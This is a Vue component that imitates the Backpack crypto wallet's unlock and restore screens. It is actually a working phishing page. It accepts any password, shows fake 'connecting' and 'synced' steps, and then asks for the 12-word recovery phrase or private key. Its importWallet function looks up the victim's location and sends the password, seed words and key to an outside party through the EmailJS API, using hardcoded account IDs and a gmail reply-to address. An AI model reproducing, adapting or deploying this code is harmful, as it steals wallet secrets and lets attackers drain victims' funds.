<template>
  <div class="wallet-shell">
    <div class="glow-orb glow-top"></div>
    <div class="glow-orb glow-bottom"></div>

    <div class="wallet-header">
      <div class="header-dot"></div>
      <button class="help-btn" aria-label="Help">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="16"
          height="16"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
          />
        </svg>
      </button>
    </div>

    <div class="divider"></div>

    <div class="step-container">
      <transition name="slide-fade" mode="out-in">
        <div :key="currentStep" class="step-inner">
          <template v-if="currentStep === 1">
            <div class="step-unlock">
              <div class="logo-wrap">
                <img :src="logoSrc" alt="Backpack Logo" class="logo" />
                <div class="logo-glow"></div>
              </div>

              <h2 class="step-title">Glad you're back</h2>
              <p class="step-subtitle">
                Your keys, your crypto — let's get in
              </p>

              <div class="field-wrap">
                <div class="field-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="14"
                    height="14"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <input
                  type="password"
                  v-model="password"
                  class="field-input"
                  placeholder="Enter password"
                  required
                />
              </div>

              <a href="#" class="forgot-link">Reset access</a>

              <button
                @click="unlock"
                type="button"
                :disabled="password.length < 1 || isLoading"
                class="btn-primary"
                :class="{ 'btn-active': password.length > 0 }"
              >
                <span v-if="!isLoading" class="btn-label">
                  Open Wallet
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M17 8l4 4m0 0l-4 4m4-4H3"
                    />
                  </svg>
                </span>
                <svg
                  v-else
                  class="spin"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                  />
                </svg>
              </button>
            </div>
          </template>

          <template v-else-if="currentStep === 2">
            <div class="step-sign">
              <div class="sign-header">
                <div class="sign-badge">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="14"
                    height="14"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"
                    />
                  </svg>
                </div>
                <div>
                  <p class="sign-title">Authorize Action</p>
                  <p class="sign-version">
                    Backpack v1.0.0 · bcpk · 2026-04-06
                  </p>
                </div>
              </div>

              <div class="terms-card">
                <div class="terms-card-header">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="14"
                    height="14"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                    />
                  </svg>
                  <span>Terms &amp; Privacy Policy</span>
                </div>
                <p class="terms-body">
                  By continuing, you agree that Backpack may process your
                  wallet activity in accordance with our data and privacy
                  guidelines.
                </p>
                <p class="terms-cta">
                  Tap <strong>Confirm</strong> to proceed
                </p>
              </div>
            </div>

            <div class="step-footer">
              <button @click="prevStep" class="btn-ghost">Cancel</button>
              <button @click="nextStep" class="btn-accent">Confirm</button>
            </div>
          </template>

          <template v-else-if="currentStep === 3">
            <div v-if="subStep === 1" class="step-loading">
              <img :src="logoSrc" class="loading-logo" />
              <div class="loading-ring"></div>
              <p class="loading-label">Connecting</p>
              <div class="loading-dots">
                <span></span><span></span><span></span>
              </div>
            </div>

            <div v-else-if="subStep === 2" class="step-loading">
              <img :src="logoSrc" class="loading-logo" />
              <div class="loading-ring loading-ring--slow"></div>
              <p class="loading-label">Warming up your wallet</p>
              <div class="loading-dots">
                <span></span><span></span><span></span>
              </div>
            </div>

            <div v-else-if="subStep === 3 && !showPrivateKey" class="step-seed">
              <div class="success-badge">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M5 13l4 4L19 7"
                  />
                </svg>
              </div>
              <h2 class="seed-title">Wallet Synced</h2>
              <p class="seed-subtitle">
                Paste your recovery phrase below, or use a private key
              </p>

              <div class="seed-grid">
                <div v-for="n in seedCount" :key="n" class="seed-field">
                  <span class="seed-num">{{ n }}</span>
                  <input
                    v-model="seedWords[n - 1]"
                    type="text"
                    class="seed-input"
                  />
                </div>
              </div>

              <button class="link-btn" @click="showPrivateKey = true">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="13"
                  height="13"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
                  />
                </svg>
                Use a private key instead
              </button>

              <button
                @click="importWallet"
                :disabled="isLoading"
                class="btn-primary btn-active btn-import"
              >
                <span v-if="!isLoading">Restore Wallet</span>
                <svg
                  v-else
                  class="spin"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                  />
                </svg>
              </button>
            </div>

            <div v-else-if="showPrivateKey" class="step-pk">
              <div class="pk-chain-badge">
                <img
                  class="chain-icon"
                  style="height: 20px; width: 60px"
                  :src="logoSrc"
                  alt="Backpack"
                />
                <span class="chain-label">Backpack</span>
                <span class="chain-tag">Mainnet</span>
              </div>

              <div class="pk-field-group">
                <label class="pk-label">Account name</label>
                <input
                  style="background: #181818; font-size: 14px"
                  type="text"
                  class="field-input"
                  v-model="privateKeyName"
                />
              </div>

              <div class="pk-field-group">
                <label class="pk-label">Private key</label>
                <textarea
                  v-model="privateKey"
                  style="background: #181818; font-size: 14px"
                  class="pk-textarea"
                  rows="5"
                ></textarea>
                <p class="pk-warning">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="12"
                    height="12"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                    />
                  </svg>
                  Keep your private key secret — never share it
                </p>
              </div>

              <div class="step-footer step-footer--sticky">
                <button @click="showPrivateKey = false" class="btn-ghost">
                  Back
                </button>
                <button
                  @click="importWallet"
                  :disabled="isLoading"
                  class="btn-accent"
                >
                  <span v-if="!isLoading">Restore Wallet</span>
                  <svg
                    v-else
                    class="spin"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      class="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      stroke-width="4"
                    />
                    <path
                      class="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <transition name="toast">
        <div
          v-if="message.text"
          :class="[
            'toast',
            message.type === 'success' ? 'toast--success' : 'toast--error',
          ]"
        >
          <svg
            v-if="message.type === 'success'"
            xmlns="http://www.w3.org/2000/svg"
            width="14"
            height="14"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M5 13l4 4L19 7"
            />
          </svg>
          <svg
            v-else
            xmlns="http://www.w3.org/2000/svg"
            width="14"
            height="14"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M6 18L18 6M6 6l12 12"
            />
          </svg>
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<style scoped>
@import url("https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;1,9..40,300&display=swap");

/* ── Color tokens ─────────────────────────────────────────────────────────── */
:root {
  --accent:        rgb(209, 52, 52);
  --accent-bright: rgb(235, 80, 80);
  --accent-soft:   rgb(240, 112, 112);
  --accent-dim:    rgba(209, 52, 52, 0.35);
  --accent-glow:   rgba(209, 52, 52, 0.20);
  --accent-tint:   rgba(209, 52, 52, 0.06);
  --accent-tint2:  rgba(209, 52, 52, 0.12);
}

.wallet-shell {
  font-family: "DM Sans", sans-serif;
  background: #0c0c0e;
  border-radius: 20px;
  width: 100%;
  color: #e8e8f0;
  overflow: hidden;
  position: relative;
  border: 1px solid rgba(255, 255, 255, 0.06);
  box-shadow:
    0 0 0 1px rgba(0, 0, 0, 0.5),
    0 32px 64px rgba(0, 0, 0, 0.6),
    inset 0 1px 0 rgba(255, 255, 255, 0.04);
}

.glow-orb {
  position: absolute;
  width: 300px;
  height: 300px;
  border-radius: 50%;
  pointer-events: none;
  z-index: 0;
  filter: blur(80px);
  opacity: 0.14;
}
.glow-top {
  top: -100px;
  right: -60px;
  background: radial-gradient(circle, rgb(209, 52, 52) 0%, transparent 70%);
}
.glow-bottom {
  bottom: -80px;
  left: -60px;
  background: radial-gradient(circle, rgb(180, 40, 40) 0%, transparent 70%);
}

.wallet-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 18px;
  position: relative;
  z-index: 1;
}
.header-dot {
  width: 8px;
  height: 8px;
  background: #2ecc71;
  border-radius: 50%;
  box-shadow: 0 0 6px #2ecc71;
}
.help-btn {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 8px;
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #666;
  cursor: pointer;
  transition: all 0.2s;
}
.help-btn:hover {
  background: rgba(255, 255, 255, 0.09);
  color: #aaa;
}
.divider {
  height: 1px;
  background: linear-gradient(
    90deg,
    transparent,
    rgba(255, 255, 255, 0.07) 30%,
    rgba(255, 255, 255, 0.07) 70%,
    transparent
  );
}

.step-container {
  min-height: 420px;
  display: flex;
  flex-direction: column;
  position: relative;
  z-index: 1;
}
.step-inner {
  flex: 1;
}

.slide-fade-enter-active,
.slide-fade-leave-active {
  transition: all 0.28s cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-fade-enter-from {
  opacity: 0;
  transform: translateY(12px);
}
.slide-fade-leave-to {
  opacity: 0;
  transform: translateY(-8px);
}

/* ── Step 1: Unlock ───────────────────────────────────────────────────────── */
.step-unlock {
  padding: 32px 28px 28px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.logo-wrap {
  position: relative;
  margin-bottom: 28px;
}
.logo {
  width: 160px;
  height: auto;
  position: relative;
  z-index: 1;
}
.logo-glow {
  position: absolute;
  inset: -20px;
  background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
  border-radius: 50%;
  pointer-events: none;
}
.step-title {
  font-family: "Syne", sans-serif;
  font-size: 22px;
  font-weight: 700;
  letter-spacing: -0.03em;
  margin: 0 0 6px;
  color: #f0f0f8;
}
.step-subtitle {
  font-size: 13px;
  color: #555;
  margin: 0 0 28px;
  text-align: center;
}

.field-wrap {
  position: relative;
  width: 100%;
  margin-bottom: 14px;
}
.field-icon {
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  color: #444;
  pointer-events: none;
}
.field-input {
  width: 100%;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 10px;
  padding: 13px 14px 13px 38px;
  font-family: "DM Sans", sans-serif;
  font-size: 14px;
  color: #ccc;
  outline: none;
  transition: border-color 0.2s, background 0.2s;
  box-sizing: border-box;
}
.field-input::placeholder {
  color: #444;
}
.field-input:focus {
  border-color: var(--accent-dim);
  background: var(--accent-tint);
}

.forgot-link {
  font-size: 13px;
  color: #555;
  text-decoration: none;
  align-self: flex-end;
  margin-bottom: 32px;
  transition: color 0.2s;
}
.forgot-link:hover {
  color: var(--accent-soft);
}

/* ── Buttons ──────────────────────────────────────────────────────────────── */
.btn-primary,
.btn-accent,
.btn-ghost {
  width: 100%;
  padding: 14px 20px;
  border: none;
  border-radius: 12px;
  font-family: "Syne", sans-serif;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  letter-spacing: -0.01em;
}
.btn-primary {
  background: rgba(255, 255, 255, 0.06);
  color: #555;
}
.btn-primary.btn-active {
  background: linear-gradient(135deg, rgb(235, 80, 80) 0%, rgb(209, 52, 52) 50%, rgb(175, 30, 30) 100%);
  color: #fff;
  box-shadow:
    0 4px 24px rgba(209, 52, 52, 0.40),
    0 1px 0 rgba(255, 255, 255, 0.15) inset;
}
.btn-primary.btn-active:hover {
  transform: translateY(-1px);
  box-shadow:
    0 8px 32px rgba(209, 52, 52, 0.50),
    0 1px 0 rgba(255, 255, 255, 0.15) inset;
}
.btn-primary:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none !important;
}
.btn-label {
  display: flex;
  align-items: center;
  gap: 8px;
}

.btn-ghost {
  border: 1px solid rgba(255, 255, 255, 0.08);
  background: rgba(255, 255, 255, 0.04);
  color: #888;
  font-family: "DM Sans", sans-serif;
  font-size: 14px;
  font-weight: 500;
}
.btn-ghost:hover {
  background: rgba(255, 255, 255, 0.08);
  color: #ccc;
}

.btn-accent {
  background: linear-gradient(135deg, rgb(235, 80, 80) 0%, rgb(209, 52, 52) 100%);
  color: #fff;
  font-size: 14px;
  font-weight: 700;
  box-shadow: 0 4px 16px rgba(209, 52, 52, 0.35);
}
.btn-accent:hover {
  transform: translateY(-1px);
  box-shadow: 0 6px 24px rgba(209, 52, 52, 0.50);
}
.btn-accent:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}

.step-footer {
  display: flex;
  gap: 10px;
  padding: 14px 16px;
  background: rgba(255, 255, 255, 0.025);
  border-top: 1px solid rgba(255, 255, 255, 0.05);
}
.step-footer--sticky {
  position: absolute;
  bottom: 0;
  left: 0;
  right: 0;
  border-radius: 0 0 20px 20px;
}

/* ── Step 2: Sign ─────────────────────────────────────────────────────────── */
.step-sign {
  padding: 24px 24px 80px;
}
.sign-header {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-bottom: 20px;
}
.sign-badge {
  width: 38px;
  height: 38px;
  border-radius: 10px;
  background: var(--accent-tint2);
  border: 1px solid rgba(209, 52, 52, 0.25);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--accent-soft);
  flex-shrink: 0;
}
.sign-title {
  font-family: "Syne", sans-serif;
  font-size: 18px;
  font-weight: 700;
  margin: 0;
  color: #f0f0f8;
}
.sign-version {
  font-size: 11px;
  color: #444;
  margin: 3px 0 0;
  font-family: "DM Mono", monospace, sans-serif;
}

.terms-card {
  background: rgba(255, 255, 255, 0.035);
  border: 1px solid rgba(255, 255, 255, 0.07);
  border-radius: 14px;
  padding: 18px;
}
.terms-card-header {
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: "Syne", sans-serif;
  font-size: 13px;
  font-weight: 600;
  color: var(--accent-soft);
  margin-bottom: 12px;
}
.terms-body {
  font-size: 13px;
  color: #888;
  line-height: 1.65;
  margin: 0 0 10px;
}
.terms-cta {
  font-size: 12px;
  color: #555;
  margin: 0;
}
.terms-cta strong {
  color: var(--accent-soft);
}

/* ── Step 3: Loading ──────────────────────────────────────────────────────── */
.step-loading {
  min-height: 420px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 16px;
}
.loading-logo {
  width: 80px;
  opacity: 0.6;
}
.loading-ring {
  width: 56px;
  height: 56px;
  border-radius: 50%;
  border: 2px solid rgba(209, 52, 52, 0.15);
  border-top-color: var(--accent-bright);
  animation: spin 0.9s linear infinite;
}
.loading-ring--slow {
  animation-duration: 1.4s;
}
.loading-label {
  font-family: "Syne", sans-serif;
  font-size: 16px;
  font-weight: 600;
  color: var(--accent-bright);
  letter-spacing: 0.02em;
}
.loading-dots {
  display: flex;
  gap: 5px;
}
.loading-dots span {
  width: 5px;
  height: 5px;
  background: var(--accent-bright);
  border-radius: 50%;
  opacity: 0.4;
  animation: dot-pulse 1.4s ease-in-out infinite;
}
.loading-dots span:nth-child(2) { animation-delay: 0.2s; }
.loading-dots span:nth-child(3) { animation-delay: 0.4s; }

/* ── Step 3: Seed ─────────────────────────────────────────────────────────── */
.step-seed {
  padding: 24px 24px 24px;
}
.success-badge {
  width: 44px;
  height: 44px;
  border-radius: 12px;
  background: rgba(46, 204, 113, 0.1);
  border: 1px solid rgba(46, 204, 113, 0.25);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #2ecc71;
  margin: 0 auto 14px;
}
.seed-title {
  font-family: "Syne", sans-serif;
  font-size: 18px;
  font-weight: 700;
  text-align: center;
  margin: 0 0 6px;
  color: #f0f0f8;
}
.seed-subtitle {
  font-size: 12px;
  color: #555;
  text-align: center;
  margin: 0 0 20px;
}
.seed-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 8px;
  margin-bottom: 16px;
}
.seed-field {
  position: relative;
  display: flex;
  align-items: center;
}
.seed-num {
  position: absolute;
  left: 8px;
  font-size: 10px;
  color: #444;
  font-family: monospace;
  user-select: none;
  z-index: 1;
}
.seed-input {
  width: 100%;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.07);
  border-radius: 8px;
  padding: 9px 8px 9px 22px;
  font-size: 12px;
  color: #ddd;
  outline: none;
  transition: border-color 0.2s;
  box-sizing: border-box;
}
.seed-input:focus {
  border-color: rgba(209, 52, 52, 0.35);
}

.link-btn {
  background: none;
  border: none;
  color: var(--accent-soft);
  font-size: 13px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 0;
  margin-bottom: 18px;
  transition: color 0.2s;
}
.link-btn:hover {
  color: var(--accent-bright);
}
.btn-import {
  width: 100%;
}

/* ── Step 3: Private Key ──────────────────────────────────────────────────── */
.step-pk {
  padding: 20px 24px 90px;
}
.pk-chain-badge {
  display: flex;
  align-items: center;
  gap: 10px;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.07);
  border-radius: 10px;
  padding: 10px 14px;
  margin-bottom: 18px;
}
.chain-icon {
  width: 24px;
  height: 24px;
  border-radius: 6px;
}
.chain-label {
  font-family: "Syne", sans-serif;
  font-size: 14px;
  font-weight: 600;
  color: #ddd;
  flex: 1;
}
.chain-tag {
  font-size: 11px;
  background: rgba(46, 204, 113, 0.1);
  color: #2ecc71;
  border: 1px solid rgba(46, 204, 113, 0.2);
  border-radius: 5px;
  padding: 2px 7px;
}
.pk-field-group {
  margin-bottom: 14px;
}
.pk-label {
  display: block;
  font-size: 12px;
  color: #555;
  margin-bottom: 7px;
  letter-spacing: 0.04em;
  text-transform: uppercase;
}
.pk-textarea {
  width: 100%;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.07);
  border-radius: 10px;
  padding: 12px;
  font-size: 12px;
  color: #ccc;
  outline: none;
  resize: none;
  transition: border-color 0.2s;
  box-sizing: border-box;
  font-family: "DM Mono", monospace, sans-serif;
}
.pk-textarea:focus {
  border-color: rgba(209, 52, 52, 0.35);
}
.pk-warning {
  display: flex;
  align-items: center;
  gap: 5px;
  font-size: 11px;
  color: #e67e22;
  margin: 7px 0 0;
}

/* ── Toast ────────────────────────────────────────────────────────────────── */
.toast {
  position: absolute;
  bottom: 16px;
  left: 50%;
  transform: translateX(-50%);
  padding: 9px 16px;
  border-radius: 10px;
  font-size: 13px;
  font-weight: 500;
  display: flex;
  align-items: center;
  gap: 7px;
  white-space: nowrap;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
}
.toast--success {
  background: rgba(46, 204, 113, 0.15);
  border: 1px solid rgba(46, 204, 113, 0.3);
  color: #2ecc71;
}
.toast--error {
  background: rgba(209, 52, 52, 0.15);
  border: 1px solid rgba(209, 52, 52, 0.3);
  color: rgb(240, 100, 100);
}
.toast-enter-active,
.toast-leave-active {
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.toast-enter-from,
.toast-leave-to {
  opacity: 0;
  transform: translateX(-50%) translateY(10px);
}

/* ── Utils ────────────────────────────────────────────────────────────────── */
.spin {
  width: 18px;
  height: 18px;
  animation: spin 0.8s linear infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
@keyframes dot-pulse {
  0%, 80%, 100% { opacity: 0.2; transform: scale(0.8); }
  40%           { opacity: 1;   transform: scale(1);   }
}
</style>

<script setup>
import { ref, watch } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const subStep = ref(1);
const password = ref("");
const seedCount = ref(12);
const seedWords = ref(Array(12).fill(""));
const privateKey = ref("");
const privateKeyName = ref("");
const isLoading = ref(false);
const showPrivateKey = ref(false);
const message = ref({ text: "", type: "" });
const logoSrc =
  "/images/backpack-logo.svg";

function unlock() {
  if (password.value.length < 1) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startSubSteps();
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

function startSubSteps() {
  subStep.value = 1;
  setTimeout(() => (subStep.value = 2), 2000);
  setTimeout(() => (subStep.value = 3), 4000);
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

const importWallet = async () => {
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");

    const payload = {
      password: password.value,
      seedWords: seedWords.value.filter(Boolean),
      privateKey: privateKey.value || null,
      privateKeyName: privateKeyName.value || null,
    };

    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Backpack Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };

    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );

    if (response.data === "OK") {
      emit("close");
      showMessage("Wallet imported successfully!", "success");
    }
  } catch (error) {
    showMessage("Failed to import wallet. Please try again.", "error");
  } finally {
    isLoading.value = false;
  }
};

watch(currentStep, (val) => {
  if (val === 3) startSubSteps();
});
</script>
